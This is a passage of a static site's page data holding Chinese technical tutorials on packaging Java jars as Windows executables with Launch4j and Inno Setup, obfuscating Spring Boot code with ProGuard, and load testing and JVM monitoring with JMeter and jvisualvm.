Parameters：定义要传递给运行文件的参数或命令行参数。这允许你向运行的程序传递额外的信息。\n * WorkingDir：指定运行文件时的工作目录。这是运行文件所在的目录。\n * Description：提供一个可选的描述，以便在安装过程中显示或记录此操作。\n * Flags：用于指定运行操作的标志，例如是否等待运行的程序完成。\n * StatusMsg：定义在执行此操作时要显示给用户的状态消息。',normalizedContent:'要将一个 java jar 文件打包成可执行的 exe 文件，可以使用 launch4j 和 inno setup 来完成这个任务。\n\nlaunch4j 用于将 java 应用程序打包为本机可执行文件（通常为 exe 文件）的工具。它的主要作用是创建一个包装器，允许用户像运行本机 windows 应用程序一样运行 java 应用程序，而无需手动启动 java 虚拟机（jvm）。 launch4j 是一个免费的开源项目，它遵循 gnu general public license（gpl）许可证。这意味着你可以免费使用 launch4j 来创建可执行文件，包括商业用途。你可以从 launch4j 的官方网站下载并使用它，无需支付许可费用。官网地址\n\nlaunch4j 功能有：\n\n * 创建本机可执行文件：launch4j 允许你将你的 java 应用程序打包为一个本机的可执行文件（通常是 exe 文件）。这意味着用户可以双击该文件来运行你的 java 应用程序，而无需手动打开命令行或 jvm。\n * 自定义可执行文件属性：你可以通过 launch4j 配置可执行文件的各种属性，如程序图标、文件版本信息、标题等。这有助于使你的 java 应用程序看起来像本机 windows 应用程序。\n * 支持类路径和 jar 文件：launch4j 允许你指定应用程序的类路径和关联的 jar 文件，以确保你的 java 应用程序能够正常运行。\n * 自动检测 main-class：它可以自动检测你的 jar 文件中的 main-class，从而无需手动指定应用程序的入口点。\n * 支持 jre 选项：你可以选择将 jre（java 运行时环境）打包到生成的可执行文件中，从而用户无需安装 jre 即可运行你的应用程序。\n * 跨平台兼容性：生成的可执行文件通常只能在 windows 上运行，但 launch4j 可以在 windows 上创建用于其他平台的包装器，例如 linux 或 macos。\n\ninno setup 本身不能直接将 jar 文件打包成 exe 文件。所以我们要先使用 launch4j 把 jar 打包成一个 exe 格式的可执行程序。inno setup 是一个免费的开源安装制作工具，它遵循许可证允许免费使用，包括商业用途。inno setup 的主要作用是创建用于安装和卸载 windows 应用程序的安装程序。官网地址\n\ninno setup 功能有：\n\n * 创建自定义安装程序：inno setup 允许开发人员创建定制的、易于使用的安装程序，用于将他们的应用程序部署到 windows 操作系统上。你可以定义安装过程的各个方面，包括文件复制、注册表项、快捷方式、开始菜单项等。\n * 支持多种安装任务：inno setup 支持各种各样的安装任务，包括简单的文件复制，注册表设置，创建快捷方式，以及执行自定义脚本和任务。这使得你可以轻松地自定义安装过程，以满足你的应用程序的特定需求。\n * 脚本化：inno setup 使用基于脚本的语言来定义安装过程。这意味着你可以编写脚本来描述安装程序的行为，使其非常灵活。inno setup 使用类似于 pascal 的脚本语言。\n * 多语言支持：inno setup 支持多种语言，允许你为不同的用户群体创建多语言安装程序，以提供本地化的安装和卸载体验。\n * 卸载支持：inno setup 不仅可以创建安装程序，还可以生成卸载程序，允许用户从他们的计算机上卸载你的应用程序。\n\n\n# 使用 launch4j\n\nlaunch4j 把 jar 包装成 .exe 程序还是有所局限的，比如启动方式只能是 java -jar，如果配合混淆就没有办法\n\n\n# basic\n\n在这里配置路径等信息\n\n\n\noutput file: 填写把 jar 打成.exe 程序的输出路径\njar：选择自己要打包的 jar\n\n\n# jre\n\n在这里配置 jvm，jdk 版本等信息\n\n\n\njre paths：不需要我们填\nmin jre version：最低 jdk 版本\nmax jre version：最高 jdk 版本\njvm option：设置 jvm 启动参数\n\n\n# console\n\n设置 console\n\n\n\n# 使用 inno setup\n\ninno setup 还是有些难度的，需要学习里面的各个关键字，回调，事件等，才能掌握 inno setup 的使用\n\n以下贴一个简单的 inno setup 示例\n\n;配置和描述安装程序的整体设置和行为\n[setup]\n; 应用名称\nappname=easy-manager-tool\n; 应用版本\nappversion=1.0\n; 默认安装目录 {pf}为 program files 这个路径是类似于 c:\\program files 的形式\ndefaultdirname={pf}\\emt\n; 应用输出到文件路径\noutputdir=c:\\users\\user\\desktop\\tool\\gen\n; 输出文件的名称\noutputbasefilename=emt\n; 指定应用程序的发布者或公司名称\napppublisher=\n; 应用程序发布者的网站或url\napppublisherurl=\n\n; 创建目录 {app} 当表应用所在的路径\n[dirs]\nname: "{app}\\go"; permissions: everyone-full\n\n; 添加文件\n[files]\nsource: "c:\\users\\user\\desktop\\build\\*"; destdir: "{app}"; flags: ignoreversion recursesubdirs createallsubdirs\n\n; 注册表\n[registry]\nroot: hklm; subkey: "system\\currentcontrolset\\control\\session manager\\environment"; valuetype: string; valuename: "path"; valuedata: "{olddata};{app}\\jdk\\bin"\n\n; 运行脚本\n[run]\nfilename: "{sys}\\cmd.exe"; parameters: "/c setx path ""{app}\\go\\bin;%path%"""; flags: runasoriginaluser; statusmsg: "setting path for go..."; check: not is64bitinstallmode\nfilename: "{app}\\runbuild.bat"; description: "runbuild.bat";\nfilename: "cmd.exe"; parameters: "/c setx path ""%path%;{app}\\jdk\\bin"" /m"; flags: runhidden; workingdir: {app}; statusmsg: "updating path environment variable..."\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# setup\n\n用于配置和描述安装程序的整体设置和行为。在 [setup] 部分中，你可以指定各种安装程序的属性，例如应用程序名称、版本号、安装目录、输出目录等。以下是 [setup] 可以描述的一些重要内容：\n\n * appname：这个选项用于指定安装程序的应用程序名称。它将在安装过程中显示给用户，通常用于在开始菜单、卸载项等位置显示应用程序的名称。\n * appversion：用于定义安装程序的版本号。这可以是你的应用程序的实际版本号，以帮助用户了解安装的内容。\n * defaultdirname：指定默认的安装目录。可以使用预定义的常量（如 {pf} 代表 program files 目录），或者指定一个具体的路径。\n * outputdir：定义生成安装程序的输出目录。这是指定生成的安装文件（通常是 .exe 文件）将被保存的位置。\n * outputbasefilename：指定生成的安装程序的文件名，通常是一个 .exe 文件。这将是用户运行的实际安装程序文件的名称。\n * apppublisher：用于指定应用程序的发布者或公司名称，它将在安装过程中显示。\n * apppublisherurl：可用于提供应用程序发布者的网站或 url，这也将在安装过程中显示。\n * appsupporturl：可以包含支持或帮助信息的 url。\n * appupdatesurl：如果有关于应用程序更新的信息或 url，可以在这里指定。\n * appmutex：用于指定应用程序的互斥体名称，以确保在安装过程中只能运行一个实例。\n * defaultgroupname：定义开始菜单中应用程序快捷方式的默认组名。\n * allowuncpath：指定是否允许安装到 unc 路径（网络共享路径）。\n * uninstalldisplayicon：定义卸载程序的显示图标。\n * uninstalldisplayname：指定卸载程序的显示名称。\n * uninstallstring：定义卸载程序的执行命令。\n\n\n# dirs\n\n用于定义在用户计算机上创建的目录结构。通过 [dirs] 部分，你可以指定要在目标计算机上创建的目录，以便在安装过程中将文件复制到这些目录中。以下是 [dirs] 可以描述的内容：\n\n 1. 目录名称：在 [dirs] 部分中，你可以列出要创建的目录的名称。这些目录名称通常是相对于安装目录（由 [setup] 部分的 defaultdirname 指定）的相对路径。\n 2. permissions：你可以为每个目录指定权限，例如读、写、执行权限。这允许你控制用户是否可以访问或修改这些目录中的文件。\n 3. subdirectories：你可以定义子目录，以便在目录创建时同时创建子目录。这有助于构建复杂的目录结构\n\n\n# files\n\n用于指定要在安装过程中包含的文件和它们的安装目标。通过 [files] 部分，你可以定义要复制到目标计算机上的文件、文件的源路径和文件的目标路径，以及其他文件相关的属性。以下是 [files] 可以描述的内容：\n\n * source：这个字段指定了要复制的文件的源路径。你可以指定完整的文件路径，也可以使用通配符来包括多个文件。\n * destdir：用于指定文件的目标目录。这是文件在用户计算机上的最终安装位置。\n * destname：指定文件在目标计算机上的名称。这可以是与源文件不同的名称。\n * check：这个字段允许你定义文件的检查方法，以确保文件在复制到目标计算机上时没有被更改或损坏。\n * permissions：你可以为每个文件定义权限，包括文件的读、写、执行权限。这允许你控制用户对文件的访问权限。\n * attribs：允许你为文件定义属性，如只读、隐藏等。\n * fontinstall：如果你的安装程序包含字体文件，你可以使用这个字段来安装字体文件并注册它们。\n * flags：用于指定与文件相关的特定标志，例如创建快捷方式。\n\n\n# registry\n\n用于在 windows 注册表中创建、修改或删除键和值。通过 [registry] 部分，你可以配置你的安装程序在用户计算机上创建注册表项，以存储应用程序的配置信息、关联文件扩展、文件关联等等。以下是 [registry] 可以描述的内容：\n\n * root：指定注册表项的根键，通常是 hkey_local_machine 或 hkey_current_user。不同的根键对应不同的部分，例如 hkey_local_machine 用于系统范围的设置，而 hkey_current_user 用于当前用户的设置。\n * subkey：指定注册表项的子键路径。这是注册表中的目标位置。\n * valuename：定义注册表值的名称。这可以是一个字符串，通常用于存储应用程序的配置信息。\n * valuetype：指定注册表值的类型，如字符串、整数等。\n * valuedata：定义注册表值的数据。这是实际的值，可以是文本、数字等。\n * flags：用于指定注册表项和值的属性，例如创建、删除、覆盖等。\n * permissions：你可以定义注册表项的权限，以确保只有具有适当权限的用户才能访问或修改注册表项。\n\n\n# run\n\n用于在安装过程中指定要运行的可执行文件、脚本或其他程序。通过 [run] 部分，你可以配置安装程序在安装完成后或卸载程序时执行的操作。以下是 [run] 可以描述的内容：\n\n * filename：指定要运行的文件的路径，这可以是一个可执行文件（.exe）、脚本（.bat、.cmd、.vbs 等）或其他程序。\n * parameters：定义要传递给运行文件的参数或命令行参数。这允许你向运行的程序传递额外的信息。\n * workingdir：指定运行文件时的工作目录。这是运行文件所在的目录。\n * description：提供一个可选的描述，以便在安装过程中显示或记录此操作。\n * flags：用于指定运行操作的标志，例如是否等待运行的程序完成。\n * statusmsg：定义在执行此操作时要显示给用户的状态消息。',charsets:{cjk:!0}},{title:"java代码混淆之 ProGuard",frontmatter:{title:"java代码混淆之 ProGuard",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/other/2/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/04.%E5%85%B6%E4%BB%96/2.java%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E4%B9%8BProGuard.html",relativePath:"00.语言/01.JAVA/04.其他/2.java代码混淆之ProGuard.md",key:"v-52ff49bd",path:"/language/java/other/2/",headers:[{level:2,title:"添加依赖",slug:"添加依赖",normalizedTitle:"添加依赖",charIndex:218},{level:2,title:"配置ProGuard",slug:"配置proguard",normalizedTitle:"配置 proguard",charIndex:2643}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"添加依赖 配置ProGuard",content:"ProGuard 是一个用于 Java 应用程序的代码混淆和优化工具，通常用于 Android 应用程序，但同样适用于 Spring Boot 应用程序。混淆代码可以增强安全性，并减小应用程序的体积。使用 proguard 混淆代码只能增加阅读和理解的难度，并不能百分百保证代码安全。也即是达到让开发人员看到这头痛的代码有 99.99999% 的冲动放弃阅读，拍桌子说还不如我重写一遍逻辑。但是如果一些重要的静态数据依然会暴漏\n\n\n# 添加依赖\n\n首先，你需要在项目的构建文件（通常是 build.gradle 或 pom.xml）中添加 ProGuard 的依赖。\n\n\x3c!-- 混淆 --\x3e\n<plugin>\n  <groupId>com.github.wvengen</groupId>\n  <artifactId>proguard-maven-plugin</artifactId>\n  <version>2.6.0</version>\n  <executions>\n    \x3c!-- 以下配置说明执行mvn的package命令时候，会执行proguard--\x3e\n    <execution>\n      <phase>package</phase>\n      <goals>\n        <goal>proguard</goal>\n      </goals>\n    </execution>\n  </executions>\n  <configuration>\n    \x3c!--  CreateProcess error=206, 文件名或扩展名太长 --\x3e\n    <putLibraryJarsInTempDir>true</putLibraryJarsInTempDir>\n    \x3c!-- 就是输入Jar的名称，我们要知道，代码混淆其实是将一个原始的jar，生成一个混淆后的jar，那么就会有输入输出。 --\x3e\n    <injar>${project.build.finalName}.jar</injar>\n    \x3c!-- 输出jar名称，输入输出jar同名的时候就是覆盖，也是比较常用的配置。 --\x3e\n    <outjar>${project.build.finalName}.jar</outjar>\n    \x3c!-- 是否混淆 默认是true --\x3e\n    <obfuscate>true</obfuscate>\n    \x3c!-- 配置一个文件，通常叫做proguard.cfg,该文件主要是配置options选项，也就是说使用proguard.cfg那么options下的所有内容都可以移到proguard.cfg中 --\x3e\n    <proguardInclude>${project.basedir}/proguard.cfg</proguardInclude>\n    \x3c!-- 额外的jar包，通常是项目编译所需要的jar --\x3e\n    <libs>\n      <lib>${java.home}/lib/rt.jar</lib>\n      <lib>${java.home}/lib/jce.jar</lib>\n      <lib>${java.home}/lib/jsse.jar</lib>\n    </libs>\n    \x3c!-- 对输入jar进行过滤比如，如下配置就是对META-INFO文件不处理。 --\x3e\n    <inLibsFilter>!META-INF/**,!META-INF/versions/9/**.class</inLibsFilter>\n    \x3c!-- 这是输出路径配置，但是要注意这个路径必须要包括injar标签填写的jar --\x3e\n    <outputDirectory>${project.basedir}/target</outputDirectory>\n    \x3c!--这里特别重要，此处主要是配置混淆的一些细节选项，比如哪些类不需要混淆，哪些需要混淆--\x3e\n    <options>\n      \x3c!-- 可以在此处写option标签配置，不过我上面使用了proguardInclude，故而我更喜欢在proguard.cfg中配置 --\x3e\n    </options>\n  </configuration>\n</plugin>\n\x3c!-- spring,注意一定要放在混淆插件之后 --\x3e\n<plugin>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-maven-plugin</artifactId>\n  <configuration>\n    <excludes>\n      <exclude>\n        <groupId>org.projectlombok</groupId>\n        <artifactId>lombok</artifactId>\n      </exclude>\n    </excludes>\n  </configuration>\n  <executions>\n    <execution>\n      \x3c!-- spingboot 打包需要repackage否则不是可执行jar --\x3e\n      <goals>\n        <goal>repackage</goal>\n      </goals>\n      <configuration>\n        <mainClass>com.aizuda.easyManagerTool.ToolBootApplication</mainClass>\n      </configuration>\n    </execution>\n  </executions>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n\n# 配置 ProGuard\n\n#指定Java的版本\n-target 1.8\n#proguard会对代码进行优化压缩，他会删除从未使用的类或者类成员变量等\n-dontshrink\n#是否关闭字节码级别的优化，如果不开启则设置如下配置\n-dontoptimize\n#混淆时不生成大小写混合的类名，默认是可以大小写混合\n-dontusemixedcaseclassnames\n# 对于类成员的命名的混淆采取唯一策略\n-useuniqueclassmembernames\n#混淆时不生成大小写混合的类名，默认是可以大小写混合\n-dontusemixedcaseclassnames\n#混淆类名之后，对使用Class.forName('className')之类的地方进行相应替代\n-adaptclassstrings\n\n#对异常、注解信息予以保留\n-keepattributes Exceptions,InnerClasses,Signature,Deprecated,SourceFile,LineNumberTable,*Annotation*,EnclosingMethod\n# 此选项将保存接口中的所有原始名称（不混淆）--\x3e\n#-keepnames interface ** { *; }\n# 此选项将保存所有软件包中的所有原始接口文件（不进行混淆）\n#-keep interface * extends * { *; }\n#保留参数名，因为控制器，或者Mybatis等接口的参数如果混淆会导致无法接受参数，xml文件找不到参数\n-keepparameternames\n# 保留枚举成员及方法\n-keepclassmembers enum * { *; }\n# 不混淆所有类,保存原始定义的注释-\n-keepclassmembers class * {\n    @org.springframework.context.annotation.Bean *;\n    @org.springframework.beans.factory.annotation.Autowired *;\n    @org.springframework.beans.factory.annotation.Value *;\n    @org.springframework.stereotype.Service *;\n    @org.springframework.stereotype.Component *;\n}\n\n#忽略warn消息\n-ignorewarnings\n#忽略note消息\n-dontnote\n#打印配置信息\n-printconfiguration\n-keep public class com.aizuda.easyManagerTool.ToolBootApplication {\n        public static void main(java.lang.String[]);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n",normalizedContent:"proguard 是一个用于 java 应用程序的代码混淆和优化工具，通常用于 android 应用程序，但同样适用于 spring boot 应用程序。混淆代码可以增强安全性，并减小应用程序的体积。使用 proguard 混淆代码只能增加阅读和理解的难度，并不能百分百保证代码安全。也即是达到让开发人员看到这头痛的代码有 99.99999% 的冲动放弃阅读，拍桌子说还不如我重写一遍逻辑。但是如果一些重要的静态数据依然会暴漏\n\n\n# 添加依赖\n\n首先，你需要在项目的构建文件（通常是 build.gradle 或 pom.xml）中添加 proguard 的依赖。\n\n\x3c!-- 混淆 --\x3e\n<plugin>\n  <groupid>com.github.wvengen</groupid>\n  <artifactid>proguard-maven-plugin</artifactid>\n  <version>2.6.0</version>\n  <executions>\n    \x3c!-- 以下配置说明执行mvn的package命令时候，会执行proguard--\x3e\n    <execution>\n      <phase>package</phase>\n      <goals>\n        <goal>proguard</goal>\n      </goals>\n    </execution>\n  </executions>\n  <configuration>\n    \x3c!--  createprocess error=206, 文件名或扩展名太长 --\x3e\n    <putlibraryjarsintempdir>true</putlibraryjarsintempdir>\n    \x3c!-- 就是输入jar的名称，我们要知道，代码混淆其实是将一个原始的jar，生成一个混淆后的jar，那么就会有输入输出。 --\x3e\n    <injar>${project.build.finalname}.jar</injar>\n    \x3c!-- 输出jar名称，输入输出jar同名的时候就是覆盖，也是比较常用的配置。 --\x3e\n    <outjar>${project.build.finalname}.jar</outjar>\n    \x3c!-- 是否混淆 默认是true --\x3e\n    <obfuscate>true</obfuscate>\n    \x3c!-- 配置一个文件，通常叫做proguard.cfg,该文件主要是配置options选项，也就是说使用proguard.cfg那么options下的所有内容都可以移到proguard.cfg中 --\x3e\n    <proguardinclude>${project.basedir}/proguard.cfg</proguardinclude>\n    \x3c!-- 额外的jar包，通常是项目编译所需要的jar --\x3e\n    <libs>\n      <lib>${java.home}/lib/rt.jar</lib>\n      <lib>${java.home}/lib/jce.jar</lib>\n      <lib>${java.home}/lib/jsse.jar</lib>\n    </libs>\n    \x3c!-- 对输入jar进行过滤比如，如下配置就是对meta-info文件不处理。 --\x3e\n    <inlibsfilter>!meta-inf/**,!meta-inf/versions/9/**.class</inlibsfilter>\n    \x3c!-- 这是输出路径配置，但是要注意这个路径必须要包括injar标签填写的jar --\x3e\n    <outputdirectory>${project.basedir}/target</outputdirectory>\n    \x3c!--这里特别重要，此处主要是配置混淆的一些细节选项，比如哪些类不需要混淆，哪些需要混淆--\x3e\n    <options>\n      \x3c!-- 可以在此处写option标签配置，不过我上面使用了proguardinclude，故而我更喜欢在proguard.cfg中配置 --\x3e\n    </options>\n  </configuration>\n</plugin>\n\x3c!-- spring,注意一定要放在混淆插件之后 --\x3e\n<plugin>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-maven-plugin</artifactid>\n  <configuration>\n    <excludes>\n      <exclude>\n        <groupid>org.projectlombok</groupid>\n        <artifactid>lombok</artifactid>\n      </exclude>\n    </excludes>\n  </configuration>\n  <executions>\n    <execution>\n      \x3c!-- spingboot 打包需要repackage否则不是可执行jar --\x3e\n      <goals>\n        <goal>repackage</goal>\n      </goals>\n      <configuration>\n        <mainclass>com.aizuda.easymanagertool.toolbootapplication</mainclass>\n      </configuration>\n    </execution>\n  </executions>\n</plugin>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n\n# 配置 proguard\n\n#指定java的版本\n-target 1.8\n#proguard会对代码进行优化压缩，他会删除从未使用的类或者类成员变量等\n-dontshrink\n#是否关闭字节码级别的优化，如果不开启则设置如下配置\n-dontoptimize\n#混淆时不生成大小写混合的类名，默认是可以大小写混合\n-dontusemixedcaseclassnames\n# 对于类成员的命名的混淆采取唯一策略\n-useuniqueclassmembernames\n#混淆时不生成大小写混合的类名，默认是可以大小写混合\n-dontusemixedcaseclassnames\n#混淆类名之后，对使用class.forname('classname')之类的地方进行相应替代\n-adaptclassstrings\n\n#对异常、注解信息予以保留\n-keepattributes exceptions,innerclasses,signature,deprecated,sourcefile,linenumbertable,*annotation*,enclosingmethod\n# 此选项将保存接口中的所有原始名称（不混淆）--\x3e\n#-keepnames interface ** { *; }\n# 此选项将保存所有软件包中的所有原始接口文件（不进行混淆）\n#-keep interface * extends * { *; }\n#保留参数名，因为控制器，或者mybatis等接口的参数如果混淆会导致无法接受参数，xml文件找不到参数\n-keepparameternames\n# 保留枚举成员及方法\n-keepclassmembers enum * { *; }\n# 不混淆所有类,保存原始定义的注释-\n-keepclassmembers class * {\n    @org.springframework.context.annotation.bean *;\n    @org.springframework.beans.factory.annotation.autowired *;\n    @org.springframework.beans.factory.annotation.value *;\n    @org.springframework.stereotype.service *;\n    @org.springframework.stereotype.component *;\n}\n\n#忽略warn消息\n-ignorewarnings\n#忽略note消息\n-dontnote\n#打印配置信息\n-printconfiguration\n-keep public class com.aizuda.easymanagertool.toolbootapplication {\n        public static void main(java.lang.string[]);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n",charsets:{cjk:!0}},{title:"JAVA 性能监控（jvisualvm）及测试（JMeter）",frontmatter:{title:"JAVA 性能监控（jvisualvm）及测试（JMeter）",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/other/3/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/04.%E5%85%B6%E4%BB%96/3.JAVA%20%E6%80%A7%E8%83%BD%E7%9B%91%E6%8E%A7%EF%BC%88jvisualvm%EF%BC%89%E5%8F%8A%E6%B5%8B%E8%AF%95%EF%BC%88JMeter%EF%BC%89.html",relativePath:"00.语言/01.JAVA/04.其他/3.JAVA 性能监控（jvisualvm）及测试（JMeter）.md",key:"v-5ae2093a",path:"/language/java/other/3/",headers:[{level:2,title:"基本理论",slug:"基本理论",normalizedTitle:"基本理论",charIndex:2},{level:2,title:"JMeter使用",slug:"jmeter使用",normalizedTitle:"jmeter 使用",charIndex:865},{level:3,title:"JMeter下载",slug:"jmeter下载",normalizedTitle:"jmeter 下载",charIndex:879},{level:3,title:"转换中文",slug:"转换中文",normalizedTitle:"转换中文",charIndex:925},{level:3,title:"创建线程组",slug:"创建线程组",normalizedTitle:"创建线程组",charIndex:936},{level:3,title:"添加http请求",slug:"添加http请求",normalizedTitle:"添加 http 请求",charIndex:1013},{level:3,title:"添加结果树",slug:"添加结果树",normalizedTitle:"添加结果树",charIndex:1036},{level:3,title:"添加汇总报告",slug:"添加汇总报告",normalizedTitle:"添加汇总报告",charIndex:1065},{level:3,title:"聚合报告",slug:"聚合报告",normalizedTitle:"聚合报告",charIndex:1080},{level:3,title:"汇总图",slug:"汇总图",normalizedTitle:"汇总图",charIndex:1093},{level:3,title:"Jmeter Address Already in use",slug:"jmeter-address-already-in-use",normalizedTitle:"jmeter address already in use",charIndex:1105},{level:2,title:"jvisualvm",slug:"jvisualvm",normalizedTitle:"jvisualvm",charIndex:1532},{level:3,title:"启动jvisualvm",slug:"启动jvisualvm",normalizedTitle:"启动 jvisualvm",charIndex:1546},{level:3,title:"线程",slug:"线程",normalizedTitle:"线程",charIndex:938},{level:3,title:"安装插件",slug:"安装插件",normalizedTitle:"安装插件",charIndex:1945},{level:3,title:"Histogram 直方图",slug:"histogram-直方图",normalizedTitle:"histogram 直方图",charIndex:2340}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"基本理论 JMeter使用 JMeter下载 转换中文 创建线程组 添加http请求 添加结果树 添加汇总报告 聚合报告 汇总图 Jmeter Address Already in use jvisualvm 启动jvisualvm 线程 安装插件 Histogram 直方图",content:'# 基本理论\n\n除了本身要掌握 JAVA API 的基本使用外，我们还需要对 JAVA 的所写项目以及测试方法要有所了解，首先我们得理解什么是响应时间，请求时间，HPS，TPS 以及 QPS 等。\n\n * 响应时间是指用户从客户端发起一个请求开始，到客户端接收到从服务器端返回的响应结果，整个过程所耗费的时间。\n * 请求时间是客户端发送请求到服务端接收到请求的时间。\n * HPS (Hits Per Second) 每秒点击次数，单位是 次 / 秒\n * TPS (Hits Per Second) 系统每秒处理交易数 (事务数，接口逻辑数)，单位是笔 / 秒\n * QPS (Query Per Second) 系统每秒处理查询次数，单位是 次 / 秒。\n * 最大、最少响应时间\n   指用户发出请求或者指令到系统做出反应 (响应) 的最大、最少时间。\n * 90% 响应时间\n   指 100 个人，有 90 个人 1s 内得到系统的反馈，就代表优化到一定的程度，还有 10% 相对优化复杂度就很高了。\n\n对于互联网业务中，如果某些业务有且仅有一个请求链接，那么 TPS=QPS=HPS，一盘情况下用 TPS 来衡量整个业务流程，用 QPS 来衡量接口查询次数，用 HPS 来表示对服务器单击请求。 无论 TPS，QPS，HPS，这些指标都是衡量系统处理能力非常重要的指标，越大越好，根据经验，一般情况下：\n\n 1. 金融行业 1K TPS~50K TPS\n 2. 保险行业 100 TPS~10W TPS\n 3. 制造行业 10 TPS~5K TPS\n 4. 互联网电子商务 1W TPS~100W TPS\n 5. 互联网中型网站 1K TPS~5W TPS\n 6. 互联网小型网站 500 TPS~1W TPS\n\n对于系统来说有三个重要的指标是我们一定要看的\n\n * 吞吐量：每秒系统能够处理的请求数，任务数\n * 响应时间：服务处理一个请求或一个任务的耗时\n * 错误率：一批请求中结果出错的请求所占比例\n\n\n# JMeter 使用\n\n\n# JMeter 下载\n\n地址\n\n> 以下所有的请求时间都为 ms，除非标有时间单位。\n\n\n# 转换中文\n\n\n\n\n# 创建线程组\n\n\n\n\n\n线程数：模拟并发用户数量\nRamp-Up 时间（秒）：在设置的时间结束之前，启动所有线程数\n循环次数：单个线程执行几次\n\n\n\n\n# 添加 http 请求\n\n\n\n\n\n\n\n\n\n\n# 添加结果树\n\n\n\n\n\n会把所有请求的信息列出来。\n\n\n# 添加汇总报告\n\n\n\n\n\n\n# 聚合报告\n\n\n\n\n\n\n# 汇总图\n\n\n\n\n\n\n# Jmeter Address Already in use\n\nwindows 本身提供的端口机制问题。\nwindows 提供给我们 TCP/IP 的端口为 1024-5000，并且要 4 分钟来循环回收他们，就导致我们在短时间内跑大量的请求时将端口沾满。\n解决方式：\n\n 1. cmd 中输入 regedit 命令打开注册表\n 2. 在 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters ，右击 Parameters ，添加一个新的 DWORD，名字为 MaxUserPort，双击 MaxUserPort ，输入数值数据为 65534，基数选择十进制 (如果是分布式运行的话，控制机器和负载机制都需要这样操作)，修改完毕后重启电脑才能生效。相同的位置还可以添加 TCPTimedWaitDelay 值为 30，和 MaxUserPort 添加方式一样。\n\n\n# jvisualvm\n\n\n# 启动 jvisualvm\n\njvisualvm 在 jdk 包中已经有了，只需要打开 cmd 输入 jvisualvm 就能启动\n\n> 在高版本 JDK（大于 1.8 或后期更新的 1.8 版本）中已经不会再自动集成 VisualVM，https://visualvm.github.io/index.html 到这里进行下载\n\n下载的 visualvm 默认会找环境中的 jdk1.8，但如果你不是 jdk1.8 则可以修改配置（visualvm_218/etc/visualvm.conf），修改内容如下：\n\n# 设置成自己安装的java路径\nvisualvm_jdkhome="D:\\tool\\java\\java17"\n\n\n1\n2\n\n\n\n# 线程\n\n\n\n运行：正常运行\n休眠：sleep 中的线程\n等待：wait 中的线程\n驻留：线程池里得空闲线程\n监视：正在阻塞的线程，等待锁的。\n\n\n# 安装插件\n\n安装插件前先检查更新，如果出错了需要更新地址，先 工具 - 插件 - 更新 - 检查更新 来检测是否有错，如果有错，先查看 jdk 版本，然后去 https://visualvm.github.io/pluginscenters.html，找到相同版本的 gz url，再到 插件 - 设置 - 编辑，更新 url 即可。\n\n\n\nvisual GC 通过它可以看到整个垃圾回收的过程。安装完成后，退出重进。\n\n\n\nGC time：14 collections，798.209ms Last Cause ：System.gc () = 发生了 14 次 GC，花了 798.209ms。\nEden Space (666.000M，292.500M)：148.296M，11 collections，223.272ms = 发生了 11 次 GC，花了 223.272ms\n\n\n# Histogram 直方图\n\n\n\n直方图只在使用 G1 垃圾回收器才会出现\n\n * Tenuring Threshold=15：这表示对象在晋升到老年代之前需要在年轻代中经历的最少垃圾收集次数。如果一个对象在年轻代中生存超过 15 次垃圾收集循环，那么它将被转移到老年代。\n * Max Tenuring Threshold=15：这是 tenuring 阈值允许的最大值。在你的例子中，Tenuring Threshold 和 Max Tenuring Threshold 都设置为 15，这意味着这是 JVM 允许的最长时间，对象在年轻代中可以逗留而不被晋升到老年代。这限制了年轻代对象的年龄上限，简化了晋升决策。\n * Desired Survivor size=268435456：这是 G1 垃圾收集器期望的每个 Survivor 空间的理想大小。理想情况下，Survivor 空间的容量会被设为这个值，以容纳从 Eden 区或另一个 Survivor 区存活下来的对象。这个设置有助于优化年轻代的内存分配和回收效率。\n * Current survivor size=8：这表示当前某个 Survivor 空间的实际大小，单位是字节。给出的例子中，显示的 8 字节看起来异常小，几乎肯定是一个显示错误或者误解，因为这样的大小远远不足以满足正常的对象存储需求。正常情况下，这个值应该接近或等于 Desired Survivor Size。可能是由于在 VisualVM 捕获那一刻状态时，Survivor 空间正在进行调整，或者存在某种报告上的偏差，需要进一步检查和确认。\n\n从 0 到 